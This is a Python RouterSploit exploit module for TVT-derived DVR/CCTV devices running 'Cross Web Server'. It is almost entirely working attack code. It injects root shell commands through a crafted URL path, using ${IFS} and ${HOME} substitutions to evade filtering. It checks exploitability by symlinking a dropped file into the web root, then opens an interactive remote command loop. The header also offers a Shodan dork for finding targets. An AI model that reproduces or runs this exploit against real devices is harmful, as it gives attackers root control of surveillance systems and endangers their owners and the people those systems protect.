"""
Hi,
This is another exploit implementation for TVT derived DVR/CCTV devices which have a root cmd injection vulnerability
This exploit is based on great work by Exodus ad kerneronsec 
(see http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html)

In the original exploit, the goal of the exploit is to play reverse nc. Here the exploit consist into running a webshell.
NOTE: This version of exploit does not implement reverse nc, it would be however easy to add.

The other difference with first exploit is here we do not rely on older vuln to check if target is exploitable.
In the first version the exploitability check relies on an older vulnerability to retrieve a file created by the exploit.
It is a path traversal vulnerabilities  (CVE-2013-6023)

In this version we avoid to rely on older vuln, instead we create a symlink to website path using exploit so that we can share file content.

If the target is vulnerable, command loop is invoked that allows executing commands on the device.


WARNING: Be careful run short and sychronous cmd with webshell or you may need to reboot your device!


NOTE: This version is a code I use on my Routersploit fork, it would be however easy to port in single autonomous python script.

Author:
emeric.nasi@sevagas.com
http://blog.sevagas.com
https://www.sevagas.com

Edited by: kogi

"""


import requests
from requests.exceptions import ConnectionError, Timeout
from socket import timeout
from routersploit.core.http.http_client import HTTPClient
from routersploit.core.exploit import *

class Exploit(HTTPClient):
    """
    Exploit implementation for TVT derived devices which have a root cmd injection backdoor
    If the target is vulnerable, command loop is invoked that allows executing commands on the device.
    """
    __info__ = {
        'name': 'TVT Cross Web Server HTTP Backdoor',
        'description': 'Exploit implementation for TVT derived devices which have a root cmd injection backdoor.'
                       'If the target is vulnerable, http command loop is invoked that allows executing commands on the device.',
        'authors': [
            'Exodus at www.kerneronsec.com',  # vulnerability discovery and first exploit (with reverse nc)
            'Emeric Nasi',  # Routersploit module
        ],
        'references': [
            'http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html',
        ],
        'devices': [
            'Lots of TVT derived devices (see original exploit)',
            'Shodan dork: "Cross Web Server"',
        ]
    }

    target = OptIP('', 'Target base address e.g. 192.168.1.1')
    port = OptPort(81, 'Target Cross Web Server http server port')  # default port

    # Disabling URL encode hack
    def raw_url_request(self, url):
        r = requests.Request('GET')
        r.url = url
        r = r.prepare()
        # set url without encoding
        r.url = url 
        s = requests.Session()
        return s.send(r)


    def run(self):
        if self.check():
            print_success("Target is vulnerable ")
            print_status("Invoking command loop") 
            shell(self)   
            self.clean()  
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    

    def execute(self, cmd):
        """ Inject a command on remote device """
        # Remove white space and slashed
        try:
            cmd = cmd.replace(" ", "${IFS}") # Trick to use whitespaces
            cmd = cmd.replace("/", "${HOME}") #  Trick to use slash

            request = "http://%s:%s/language/Swedish${IFS}&&" % (self.target, str(self.port))
            request += cmd
            request += "&>o&&tar${IFS}/string.js"
            # Send cmd to server
            self.raw_url_request(request)
            response = self.raw_url_request("http://%s:%s/o" % (self.target, str(self.port)))
            if response is None:
                return ""
            return response.text
        except (ConnectionError, Timeout, timeout) as e:
            print_error("Unable to connect reason: %s.  exiting..." % e.message)
            return ""
            
    
    def clean(self):
        """ Remove created files """
        self.execute("rm WebSites/o")
        self.execute("rm o")
        
    
    @mute 
    def check(self):
        
        """ 
        Test if site is exploitable
        Create a file /mnt/mtd/o and put value '1' inside
        Then create a link from /mnt/mtd/WebSites/o to /mnt/mtd/o and check with http://<ip>:<port>/o contains 1
        Return true in case of success, or else false
        This way we avoid to rely on TVT path traversal vuln which is much older (CVE-2013-6023)
        """
        exploitable = True
        try:
            # Create file o
            cmd = "echo 1>o"
            cmd = cmd.replace(" ", "${IFS}") 
            request = "http://%s:%s/language/Swedish${IFS}&&" % (self.target, str(self.port))
            request += cmd + "&&tar${IFS}/string.js"
            # Send cmd to server
            self.raw_url_request(request)
            # Next create symlink to WebSites dir
            cmd = "ln o WebSites/o"
            cmd = cmd.replace(" ", "${IFS}") # Trick to use whitespaces
            cmd = cmd.replace("/", "${HOME}") # Trick to use slash
            request = "http://%s:%s/language/Swedish${IFS}&&" % (self.target, str(self.port))
            request += cmd + "&&tar${IFS}/string.js"
            self.raw_url_request(request)
            # Check if file was correctly created
            response = self.raw_url_request("http://%s:%s/o" % (self.target, str(self.port)))
            if response is None:
                exploitable = False
            elif response.text == "" or (response.text)[0] != '1': 
                print_error("Expected response content first char to be '1' got %s. " % response.text)
                exploitable = False
    
        except (ConnectionError, Timeout, timeout) as e:
            print_error("Unable to connect. reason: %s." % e.message)
            exploitable = False
    
        if exploitable:
            print_success("Exploitable!")
        else:
            print_error("Not Exploitable.")
        return(exploitable)
